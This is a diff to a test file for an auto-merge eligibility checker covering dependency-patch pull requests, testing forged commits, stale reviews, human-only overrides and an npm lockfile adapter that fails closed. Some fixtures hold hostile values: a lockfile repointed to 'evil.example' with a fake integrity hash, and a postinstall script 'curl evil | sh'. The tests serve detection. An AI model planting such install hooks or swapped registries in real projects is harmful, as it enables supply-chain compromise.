@@ -23,6 +23,7 @@ import {
 import { npmDependencyChanges } from "../src/adapters/npm.mjs";
 import { githubFacts } from "../src/adapters/github.mjs";
 import { gitRepo, stateRoot } from "./helpers.mjs";
+import { next } from "../src/index.mjs";
 
 const BIN = new URL("../src/cli/main.mjs", import.meta.url).pathname;
 const POLICY = JSON.parse(readFileSync(new URL("../examples/dependabot-patch.json", import.meta.url), "utf8"));
@@ -62,7 +63,9 @@ function eligibleCase({ policy = POLICY, finding = null, classify = { category: 
     ...local,
     changedPaths: ["package.json", "package-lock.json"],
     author: { login: BOT, type: "Bot" },
-    commits: [{ sha: head, verified: true, author: BOT }],
+    commits: [{ sha: head, verified: true, reason: "valid", author: BOT, committer: "web-flow" }],
+    commitsComplete: true,
+    source: "github",
     checks: { required: ["test"], runs: [{ name: "test", headSha: head, status: "completed", conclusion: "success" }] },
     approvals: { count: 0, required: 0 },
     branchProtection: { known: true, satisfied: true },
@@ -96,13 +99,23 @@ test("a PR title or green CI alone is not enough: the author, commits and depend
   assert.deepEqual(codes(human), ["no-rule-matches"]);
   assert.match(human.reasons[0].rules[0].why[0], /the author is mallory/);
   const pushed = evaluateEligibility({ state, facts: with_(facts, { commits: [...facts.commits, { sha: "f".repeat(40), verified: false, author: "mallory" }] }) });
-  assert.deepEqual(pushed.reasons[0].rules[0].why, [`commit ffffffffffff has no verified signature`, `commit ffffffffffff was authored by mallory`]);
+  assert.deepEqual(pushed.reasons[0].rules[0].why, [
+    "commit ffffffffffff has no verified signature",
+    "commit ffffffffffff was authored by mallory",
+    "commit ffffffffffff was committed by an unknown account, not signed by the host",
+  ]);
+  // Signed by someone else, with the bot's author email: GitHub says
+  // verified and attributes it to the bot, but the committer is a person.
+  const forged = evaluateEligibility({ state, facts: with_(facts, { commits: [...facts.commits, { sha: "e".repeat(40), verified: true, reason: "valid", author: BOT, committer: "mallory" }] }) });
+  assert.deepEqual(forged.reasons[0].rules[0].why, ["commit eeeeeeeeeeee was committed by mallory, not signed by the host"]);
+  const truncated = evaluateEligibility({ state, facts: with_(facts, { commitsComplete: false }) });
+  assert.match(truncated.reasons[0].rules[0].why[0], /only part of the commits/);
   const minor = evaluateEligibility({ state, facts: with_(facts, { dependencyChanges: [{ name: "lodash", from: "4.17.21", to: "4.18.0", change: "changed" }] }) });
   assert.match(minor.reasons[0].rules[0].why[0], /4\.18\.0 is minor, not a patch update/);
   const added = evaluateEligibility({ state, facts: with_(facts, { dependencyChanges: [{ name: "left-pad", from: null, to: "1.0.0", change: "added" }] }) });
   assert.match(added.reasons[0].rules[0].why[0], /is added, not a patch update/);
   const unknown = evaluateEligibility({ state, facts: with_(facts, { dependencyChanges: null }) });
-  assert.match(unknown.reasons[0].rules[0].why[0], /no dependency changes were found/);
+  assert.match(unknown.reasons[0].rules[0].why[0], /no usable dependency evidence/);
   const extra = evaluateEligibility({ state, facts: with_(facts, { changedPaths: [...facts.changedPaths, "scripts/postinstall.js"] }) });
   assert.match(extra.reasons[0].rules[0].why[0], /scripts\/postinstall\.js is outside the rule's paths/);
 });
@@ -130,7 +143,9 @@ test("an unresolved disqualifying finding blocks; a cleared one does not; a judg
   const e = evaluateEligibility({ state: blocker.state, facts: blocker.facts });
   assert.equal(e.outcome, BLOCKED);
   assert.deepEqual(codes(e), ["disqualifying-finding"]);
-  blocker.review.dispose({ finding: "F1", as: "wrong", note: "it is the real package", actor: A });
+  // Clearing a blocker overrides an independent verification: people only.
+  assert.throws(() => blocker.review.dispose({ finding: "F1", as: "wrong", note: "it is the real package", actor: A }), (e) => e.code === "workflow/forbidden");
+  blocker.review.dispose({ finding: "F1", as: "wrong", note: "it is the real package", actor: "human:steve" });
   assert.equal(evaluateEligibility({ state: blocker.review.read(), facts: blocker.facts }).outcome, ELIGIBLE);
   blocker.review.dispose({ finding: "F1", as: "accepted", actor: A });
   assert.deepEqual(codes(evaluateEligibility({ state: blocker.review.read(), facts: blocker.facts })), ["disqualifying-finding"], "accepted means real and still there");
@@ -158,8 +173,8 @@ test("a changed head, merge base or policy makes the review stale for merging", 
 test("missing or uncertain classification, or a sensitive category, goes to a person", () => {
   const none = eligibleCase({ classify: null });
   const e = evaluateEligibility({ state: none.state, facts: none.facts });
-  assert.equal(e.outcome, BLOCKED, "no category also means no rule matches");
-  assert.deepEqual(codes(e), ["unclassified", "no-rule-matches"]);
+  assert.equal(e.outcome, ESCALATE, "the fix is to classify it, so a person or agent is asked, not told to merge by hand");
+  assert.deepEqual(codes(e), ["unclassified"]);
   const unsure = eligibleCase({ classify: { category: "deps-patch", probability: 0.6 } });
   const u = evaluateEligibility({ state: unsure.state, facts: unsure.facts });
   assert.equal(u.outcome, ESCALATE);
@@ -186,6 +201,12 @@ test("dry run: eligible only if a fresh recheck matches; a head that moved in be
   const eligibility = evaluateEligibility({ state, facts });
   const ok = prepareMerge({ eligibility, recheck: () => evaluateEligibility({ state, facts }), repo: REF.repo, number: 9 });
   assert.deepEqual(ok.result, { merged: false, dryRun: true, wouldMerge: { repo: REF.repo, number: 9, sha: head } });
+  assert.equal(ok.simulated, false, "fetched facts are a real decision");
+  const fromFile = with_(facts, { source: "file" });
+  assert.throws(() => prepareMerge({ eligibility, recheck: () => evaluateEligibility({ state, facts: fromFile }) }), (e) => e.reasons.some((r) => /facts source changed/.test(r.message)), "a recheck from a file cannot stand in for fetched facts");
+  const sim = evaluateEligibility({ state, facts: fromFile });
+  assert.equal(sim.provenance.factsSource, "file");
+  assert.equal(prepareMerge({ eligibility: sim, recheck: () => sim }).simulated, true);
 
   const moved = with_(facts, { head: "c".repeat(40) });
   assert.throws(
@@ -211,7 +232,7 @@ test("the CLI: eligibility check and merge dry-run from facts files, with a rech
   const cli = (...args) => spawnSync("node", [BIN, ...args, "--repo", REF.repo, "--key", REF.key, "--state", root], { encoding: "utf8" });
   const check = cli("eligibility", "check", "--facts", now, "--text");
   assert.equal(check.status, 0, check.stderr);
-  assert.equal(check.stdout.trim(), "eligible (rule dependabot-npm-patch)");
+  assert.equal(check.stdout.trim(), "eligible (rule dependabot-npm-patch); simulated from file facts");
   const dry = cli("merge", "dry-run", "--facts", now);
   assert.equal(dry.status, 0, dry.stderr);
   assert.deepEqual(JSON.parse(dry.stdout).result, { merged: false, dryRun: true, wouldMerge: { repo: REF.repo, number: REF.key, sha: head } });
@@ -219,8 +240,93 @@ test("the CLI: eligibility check and merge dry-run from facts files, with a rech
   assert.equal(stale.status, 1);
   assert.ok(JSON.parse(stale.stderr).error.reasons.some((r) => r.code === "stale-eligibility"));
   const blocked = cli("eligibility", "check", "--facts", later, "--text");
-  assert.match(blocked.stdout, /^blocked\n  blocks: the head is now cccccccccccc/);
+  assert.match(blocked.stdout, /^blocked; simulated from file facts\n  blocks: the head is now cccccccccccc/);
   assert.equal(cli("eligibility", "check").status, 2, "facts are required: --pr or --facts");
+});
+
+test("a local target behind the host's tip blocks: the policy and merge base may be stale", () => {
+  const { state, facts } = eligibleCase();
+  const behind = with_(facts, { target: { ref: "main", commit: "9".repeat(40) }, localTarget: { ref: "main", commit: facts.target.commit } });
+  const e = evaluateEligibility({ state, facts: behind });
+  assert.deepEqual(codes(e), ["target-not-fetched"]);
+  assert.match(e.reasons[0].message, /fetch it, then start the review again/);
+});
+
+test("a disputed finding: rejecting it drops it; approving it makes it real, and a person can then clear it", () => {
+  const f = { title: "lockfile pulls a typosquat", file: "package-lock.json", line: 1, precondition: "p", scenario: "s", evidence: "e" };
+  const run = (decision) => {
+    const repo = gitRepo(POLICY);
+    const review = openReview(stateRoot(), REF);
+    review.start({ git: repo.adapter, targetRef: "main", head: "feature", actor: A });
+    review.recordRun({ slot: "correctness", status: "ok", model: "anthropic/opus", head: repo.head, actor: A, findings: [f] });
+    review.recordRun({ slot: "security", status: "ok", model: "openai/gpt-5.5", head: repo.head, actor: A });
+    review.advance({ actor: A });
+    const d = (kind, label, model) => review.decide({ finding: "F1", kind, label, probability: 0.9, rationale: "r", verifier: { model }, head: repo.head, actor: A });
+    d("finding-verification", "confirmed", "openai/gpt-5.5");
+    d("finding-verification", "refuted", "google/gemini-3");
+    assert.deepEqual(next(review.read()).action.findings.map((x) => x.kinds), [["finding-severity", "finding-origin"]], "a disputed finding is rated before a person settles it");
+    d("finding-severity", "blocker", "openai/gpt-5.5");
+    d("finding-origin", "introduced", "openai/gpt-5.5");
+    review.classify({ category: "deps-patch", probability: 0.95, rationale: "r", classifier: { model: "openai/gpt-5.5" }, head: repo.head, actor: A });
+    review.report({ actor: A });
+    const x = review.read().escalations.find((e) => e.code === "verifiers-disagree");
+    review.resolveEscalation({ id: x.id, decision, reason: "looked at it", actor: "human:steve" });
+    return review;
+  };
+  const finding = (e) => e.reasons.filter((r) => r.finding === "F1" || r.code === "escalation-rejected").map((r) => r.code);
+  const rejected = run("reject");
+  assert.deepEqual(finding(evaluateEligibility({ state: rejected.read(), facts: { head: null } })), [], "rejected: not a problem, and nothing blocks on it");
+  const approved = run("approve");
+  assert.deepEqual(finding(evaluateEligibility({ state: approved.read(), facts: { head: null } })), ["disqualifying-finding"]);
+  approved.dispose({ finding: "F1", as: "not-worth-it", note: "pinned upstream", actor: "human:steve" });
+  assert.deepEqual(finding(evaluateEligibility({ state: approved.read(), facts: { head: null } })), []);
+});
+
+test("once the change is classified, only a person can change its category", () => {
+  const { review, head } = eligibleCase({ classify: { category: "security-sensitive", probability: 0.95 } });
+  const cls = (category, actor) => review.classify({ category, probability: 0.99, rationale: "r", classifier: { model: "openai/gpt-5.5" }, head, actor });
+  assert.throws(() => cls("deps-patch", A), (e) => e.code === "workflow/forbidden");
+  assert.equal(review.read().rounds[1].classification.category, "security-sensitive");
+  cls("deps-patch", "human:steve");
+  assert.equal(review.read().rounds[1].classification.category, "deps-patch");
+});
+
+test("the npm adapter fails closed on what is not a plain version step", () => {
+  const repo = gitRepo(POLICY);
+  repo.git("checkout", "-q", "main");
+  const lock = (pkgs, extra = {}) => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, ...pkgs }, ...extra });
+  const lodash = (v, more = {}) => ({ "node_modules/lodash": { version: v, resolved: `https://registry.npmjs.org/lodash/-/lodash-${v}.tgz`, integrity: `sha512-${v}`, ...more } });
+  repo.write("package.json", JSON.stringify({ name: "w", dependencies: { lodash: "^4.17.20" } }));
+  repo.write("package-lock.json", lock(lodash("4.17.20")));
+  const base = repo.commit("base");
+  const at = (pkg, lockText) => {
+    repo.write("package.json", JSON.stringify(pkg));
+    repo.write("package-lock.json", lockText);
+    return repo.commit("change");
+  };
+  const changes = (head) => npmDependencyChanges(repo.adapter, base, head).map((c) => [c.name, c.change, c.detail ?? null]);
+
+  const swapped = at({ name: "w", dependencies: { lodash: "^4.17.20" } }, lock(lodash("4.17.20", { resolved: "https://evil.example/lodash.tgz", integrity: "sha512-evil" })));
+  assert.deepEqual(changes(swapped), [["lodash", "other", "resolved, integrity changed without a version change"]]);
+
+  const otherHost = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, lock(lodash("4.17.21", { resolved: "https://evil.example/lodash-4.17.21.tgz" })));
+  assert.equal(changes(otherHost)[0][1], "other");
+  assert.match(changes(otherHost)[0][2], /registry changed from registry\.npmjs\.org to evil\.example/);
+
+  const installScript = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, lock(lodash("4.17.21", { hasInstallScript: true })));
+  assert.deepEqual(changes(installScript)[0], ["lodash", "other", "hasInstallScript changed"]);
+
+  const script = at({ name: "w", dependencies: { lodash: "^4.17.21" }, scripts: { postinstall: "curl evil | sh" } }, lock(lodash("4.17.21")));
+  assert.deepEqual(changes(script).find((c) => c[0] === "package.json"), ["package.json", "other", "scripts changed"]);
+
+  const operator = at({ name: "w", dependencies: { lodash: "~4.17.21" } }, lock(lodash("4.17.21")));
+  assert.deepEqual(changes(operator).find((c) => c[2]?.includes("operator")), ["lodash", "other", 'the range operator changed from "^" to "~"']);
+
+  const v1 = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, JSON.stringify({ lockfileVersion: 1, dependencies: { lodash: { version: "4.17.21" } } }));
+  assert.equal(npmDependencyChanges(repo.adapter, base, v1), null, "a lockfile without a packages map is no evidence");
+
+  const clean = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, lock(lodash("4.17.21")));
+  assert.deepEqual(changes(clean), [["lodash", "changed", null], ["lodash", "changed", null]], "a plain patch step is still a patch");
 });
 
 test("semver: only a release-to-release patch step counts as a patch", () => {
